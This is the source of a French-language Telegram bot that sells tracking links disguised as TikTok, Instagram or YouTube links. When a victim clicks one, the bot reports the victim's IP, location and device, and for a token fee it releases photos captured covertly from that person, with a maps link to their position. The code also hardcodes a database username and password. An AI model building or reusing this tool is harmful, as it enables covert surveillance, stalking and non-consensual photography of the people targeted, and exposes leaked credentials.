const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const dotenv = require("dotenv");
const crypto = require("crypto");
const mongoose = require("mongoose");

// Configuration de l'environnement
dotenv.config();

// --- 0. CONNEXION MONGODB (CLÉ DU SUCCÈS) ---
// J'ai retiré les signes < > de votre mot de passe.
// Si votre mot de passe contient vraiment < et >, remettez-les.
const MONGO_URI = "mongodb+srv://Dssiaka:Keita1234.76100137@queennezuko.gnrhdxk.mongodb.net/";

mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connecté à MongoDB (Jetons Immortels activés)"))
    .catch(err => console.error("❌ Erreur MongoDB:", err));

// Définition du "Schéma" utilisateur (Ce qui est stocké)
const userSchema = new mongoose.Schema({
    chatId: { type: String, required: true, unique: true },
    coins: { type: Number, default: 0 },
    lastActive: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Fonction helper pour récupérer ou créer un utilisateur
async function getUser(chatId) {
    let user = await User.findOne({ chatId: chatId.toString() });
    if (!user) {
        user = await User.create({ chatId: chatId.toString(), coins: 0 });
    }
    return user;
}

// --- CONFIGURATION DES TARIFS ---
const PRIX_GENERATION = 3;  // Coût pour créer un lien
const PRIX_PHOTOS = 3;      // Coût pour voir les photos
const NB_PHOTOS_A_AFFICHER = 3; // Max photos à envoyer

// --- CONFIGURATION DU BOT ---
process.env.NTBA_FIX_319 = 1;
process.env.NTBA_FIX_350 = 1;

// Filtrer les logs
const originalLog = console.log;
console.log = (...args) => {
    const message = args.join(" ");
    if (message.includes("TLSWrap") || message.includes("Symbol(") || message.includes("kBuffer")) return;
    originalLog.apply(console, args);
};

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error("❌ TELEGRAM_BOT_TOKEN manquant !");
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        autoStart: true,
        params: { timeout: 10 }
    } 
});

const BASE_URL = process.env.RENDER_EXTERNAL_URL 
    ? process.env.RENDER_EXTERNAL_URL.replace(/\/$/, "")
    : `http://localhost:${process.env.PORT || 5000}`;

const DEFAULT_SECURE_TOKEN = "secure_default_token_" + crypto.createHash("sha256").update("replit_telegram_bot_2024").digest("hex");
const authToken = process.env.DATA_ACCESS_TOKEN || DEFAULT_SECURE_TOKEN;

let isAdminMode = false;

console.log(`🤖 Bot Telegram démarré !`);

// --- COMMANDES ADMINISTRATEUR ---

bot.onText(/DsSiakaAdmin/, (msg) => {
    isAdminMode = true;
    bot.sendMessage(msg.chat.id, "🔓 **Mode Admin ACTIVÉ !**\n\nCommandes :\n`/addcoins [ID] [MONTANT]`\n`/lock` pour verrouiller.", { parse_mode: "Markdown" });
});

bot.onText(/\/lock/, (msg) => {
    isAdminMode = false;
    bot.sendMessage(msg.chat.id, "🔒 **Mode Admin VERROUILLÉ.**");
});

bot.onText(/\/addcoins (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAdminMode) return bot.sendMessage(chatId, "🚫 **Accès refusé.**");

    const targetId = match[1];
    const amount = parseInt(match[2]);

    try {
        // Mise à jour atomique dans MongoDB (plus sûr)
        const user = await User.findOneAndUpdate(
            { chatId: targetId },
            { $inc: { coins: amount } }, // Incrémente les jetons
            { new: true, upsert: true }  // Crée l'user s'il n'existe pas
        );
        
        bot.sendMessage(chatId, `✅ **Succès !**\n${amount} jetons ajoutés à \`${targetId}\`.\nNouveau solde : ${user.coins} 🪙`, { parse_mode: "Markdown" });
        bot.sendMessage(targetId, `🎁 **Paiement Reçu !**\nL'admin vous a crédité de ${amount} jetons.\nNouveau solde : ${user.coins} 🪙`).catch(() => {});
        
    } catch (err) {
        bot.sendMessage(chatId, "❌ Erreur Base de Données.");
        console.error(err);
    }
});

// --- COMMANDES UTILISATEUR ---

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const user = await getUser(chatId);
    
    bot.sendMessage(chatId, 
        `🔥 *Bot de Capture Activé !*\n\n` +
        `💰 *Solde :* ${user.coins} jetons\n\n` +
        `📋 *Tarifs :*\n` +
        `• Générer un lien : ${PRIX_GENERATION} 🪙\n` +
        `• Voir les photos : ${PRIX_PHOTOS} 🪙\n\n` +
        `🎯 *Menu :* \n` +
        `/generate - Créer un lien\n` +
        `/acheter - Acheter des jetons 💎\n` +
        `/balance - Voir mon solde`, 
        { parse_mode: "Markdown" }
    );
});

bot.onText(/\/acheter/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        `💎 **ACHETER DES JETONS** 💎\n\n` +
        `Vendeur officiel : 👉 **@DsSiaka**\n\n` +
        `🆔 **Ton ID :** \`${chatId}\`\n\n` +
        `⚡ Recharge immédiate après paiement !`, 
        { parse_mode: "Markdown" }
    );
});

bot.onText(/\/balance/, async (msg) => {
    const user = await getUser(msg.chat.id);
    bot.sendMessage(msg.chat.id, `💰 **Portefeuille :** ${user.coins} jetons 🪙\nBesoin de plus ? Contactez @DsSiaka`, { parse_mode: "Markdown" });
});

// --- GÉNÉRATION DE LIENS ---
bot.onText(/\/generate/, async (msg) => {
    const chatId = msg.chat.id;
    const user = await getUser(chatId);

    if (user.coins < PRIX_GENERATION) {
        return bot.sendMessage(chatId, 
            `⚠️ **Solde insuffisant !**\n\n` +
            `Coût : ${PRIX_GENERATION} jetons.\n` +
            `Solde : ${user.coins} jetons.\n\n` +
            `🛒 Contactez **@DsSiaka** pour recharger.`, 
            { parse_mode: "Markdown" }
        );
    }

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🎵 TikTok", callback_data: "tiktok" }, { text: "📸 Instagram", callback_data: "instagram" }],
                [{ text: "📺 YouTube", callback_data: "youtube" }],
            ],
        }
    };

    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nCoût : ${PRIX_GENERATION} 🪙\nSolde : ${user.coins} 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
});

// --- GESTION DES CLICS ---
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    // A. Voir Preview (Gratuit)
    if (data.startsWith("data_")) {
        bot.answerCallbackQuery(query.id);
        const linkId = data.replace("data_", "");
        await sendDataPreview(chatId, linkId);
        return;
    }

    // B. Acheter Photos (Payant)
    if (data.startsWith("buyphotos_")) {
        const linkId = data.replace("buyphotos_", "");
        const user = await getUser(chatId);

        if (user.coins < PRIX_PHOTOS) {
            return bot.answerCallbackQuery(query.id, { text: `❌ Manque de jetons ! Il faut ${PRIX_PHOTOS} 🪙`, show_alert: true });
        }

        // Débit via MongoDB
        user.coins -= PRIX_PHOTOS;
        await user.save();
        
        bot.answerCallbackQuery(query.id, { text: `✅ Photos débloquées (-${PRIX_PHOTOS} 🪙)` });
        await sendPhotos(chatId, linkId);
        return;
    }

    // C. Générer Lien (Payant)
    const platform = data;
    const user = await getUser(chatId);
    
    if (user.coins < PRIX_GENERATION) {
        bot.sendMessage(chatId, "❌ **Solde épuisé !** Contactez @DsSiaka.");
        return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant !", show_alert: true });
    }

    try {
        const response = await axios.post(`${BASE_URL}/generate-link`, { platform, chatId });
        const { id, url } = response.data;

        // Débit via MongoDB
        user.coins -= PRIX_GENERATION;
        await user.save();

        bot.answerCallbackQuery(query.id, { text: `✅ Lien généré ! -${PRIX_GENERATION} Jetons` });

        const message = `✅ *LIEN CRÉÉ !*\n\n` +
                        `🔗 ${url}\n\n` +
                        `💰 Restant : ${user.coins} 🪙\n` +
                        `⚡ En attente du clic...`;

        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔗 Ouvrir", url: url }],
                    [{ text: "📊 Voir Données", callback_data: `data_${id}` }]
                ]
            }
        };

        bot.sendMessage(chatId, message, { parse_mode: "Markdown", disable_web_page_preview: true, ...keyboard });

    } catch (error) {
        console.error("Erreur génération:", error.message);
        bot.answerCallbackQuery(query.id, { text: "❌ Erreur serveur", show_alert: true });
    }
});

// --- FONCTIONS AFFICHAGE ---

bot.onText(/\/data (.+)/, async (msg, match) => {
    await sendDataPreview(msg.chat.id, match[1].trim());
});

async function sendDataPreview(chatId, linkId) {
    try {
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
        });
        const data = response.data;
        const photoCount = data.images ? data.images.length : 0;

        let message = `📊 *RAPPORT* - \`${linkId}\`\n\n`;
        message += `⏰ ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
        message += `🌐 IP: ${data.ip || "Masquée"}\n`;

        if (data.location && data.location.latitude) {
            message += `📍 ${data.location.city || "?"}, ${data.location.country || "?"}\n`;
        }

        if (data.device) {
            message += `📱 ${data.device.vendor || ""} ${data.device.model || "Mobile"}\n`;
        }

        message += `\n📸 *Photos disponibles :* ${photoCount}\n`;
        
        const keyboard = { reply_markup: { inline_keyboard: [] } };
        
        if (photoCount > 0) {
            message += `🔒 *Photos verrouillées.*\nCoût : ${PRIX_PHOTOS} 🪙`;
            keyboard.reply_markup.inline_keyboard.push([
                { text: `📸 Voir les ${Math.min(photoCount, NB_PHOTOS_A_AFFICHER)} Photos (${PRIX_PHOTOS} 🪙)`, callback_data: `buyphotos_${linkId}` }
            ]);
        } else {
            message += `⚠️ Aucune photo capturée.`;
        }

        await bot.sendMessage(chatId, message, { parse_mode: "Markdown", ...keyboard });

    } catch (error) {
        bot.sendMessage(chatId, `❌ Données introuvables pour \`${linkId}\``);
    }
}

async function sendPhotos(chatId, linkId) {
    try {
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
        });
        const data = response.data;
        
        if (!data.images || data.images.length === 0) return;

        await bot.sendMessage(chatId, `🔓 **Photos débloquées !** Envoi en cours...`);

        const limit = Math.min(data.images.length, NB_PHOTOS_A_AFFICHER);
        
        for (let i = 0; i < limit; i++) {
            try {
                const imgBuffer = Buffer.from(data.images[i], "base64");
                await bot.sendPhoto(chatId, imgBuffer, { 
                    caption: `📸 Photo ${i + 1}/${limit}` 
                });
            } catch (err) {
                console.error(`Erreur image ${i}:`, err);
            }
        }
        
        if (data.location && data.location.latitude) {
            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
            bot.sendMessage(chatId, `🗺️ [Voir position sur Maps](${mapsUrl})`, { parse_mode: "Markdown" });
        }

    } catch (error) {
        bot.sendMessage(chatId, "❌ Erreur lors de l'envoi des photos.");
    }
}

bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, 
        `📚 *AIDE*\n\n` +
        `1. /generate (Coût ${PRIX_GENERATION}🪙)\n` +
        `2. Envoie le lien.\n` +
        `3. Vois le rapport (IP, etc).\n` +
        `4. Débloque les photos (Coût ${PRIX_PHOTOS}🪙).\n\n` +
        `💎 **Recharge :** @DsSiaka`, 
        { parse_mode: "Markdown" }
    );
});

// Logs d'erreur
bot.on("polling_error", (error) => console.log(`⚠️ Erreur Polling: ${error.message}`));
bot.on("webhook_error", (error) => console.log(`⚠️ Erreur Webhook: ${error.message}`));
